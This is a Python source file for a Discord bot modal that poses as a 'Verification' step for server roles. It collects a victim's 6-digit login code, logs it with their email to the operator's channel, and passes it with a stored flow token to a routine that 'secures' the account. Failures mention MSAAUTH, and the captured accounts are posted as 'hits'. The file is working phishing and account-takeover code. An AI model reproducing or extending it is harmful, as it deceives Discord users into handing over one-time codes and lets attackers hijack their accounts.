from views.utils.startSecure import startSecuringAccount
from discord import ui
import datetime
import discord
import json
import asyncio

config = json.load(open("config.json", "r+"))

class MyModalTwo(ui.Modal, title="Verification"):
    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if len(str(self.box_three.value)) != 6:
            await interaction.response.send_message(
                "❌ | The code must be 6 digits long.", 
                ephemeral=True
            )
            return  
        
        data = json.load(open("data.json", "r+"))

        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        Code_embed = discord.Embed(
            title = f"{interaction.user.name} | {interaction.user.id}",
            description=f"**Email** | **Status**\n```{data["email"]} | Got Code | {self.box_three.value}```",
            timestamp = datetime.datetime.now(),
            colour = 0x79D990,                           
        )

        await interaction.response.defer()

        await logs_channel.send("**This Account is being automaticly secured.**")
        await logs_channel.send(embed = Code_embed)

        await interaction.followup.send(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )

        embeds = await asyncio.to_thread(startSecuringAccount, data["email"], data["flowtoken"], self.box_three.value)

        if embeds is None:
            await logs_channel.send(
                embed = discord.Embed(
                    title = f"Failed to Secure - {interaction.user.name} ({interaction.user.id})",
                    description = f"**Email**\n```{data["email"]}```\n**Error**\n```Failed to get MSAAUTH```",
                    colour=0xDE755B
                )
            )
            return

        for embed in embeds:
            await hits_channel.send(
                embed = embed
            )
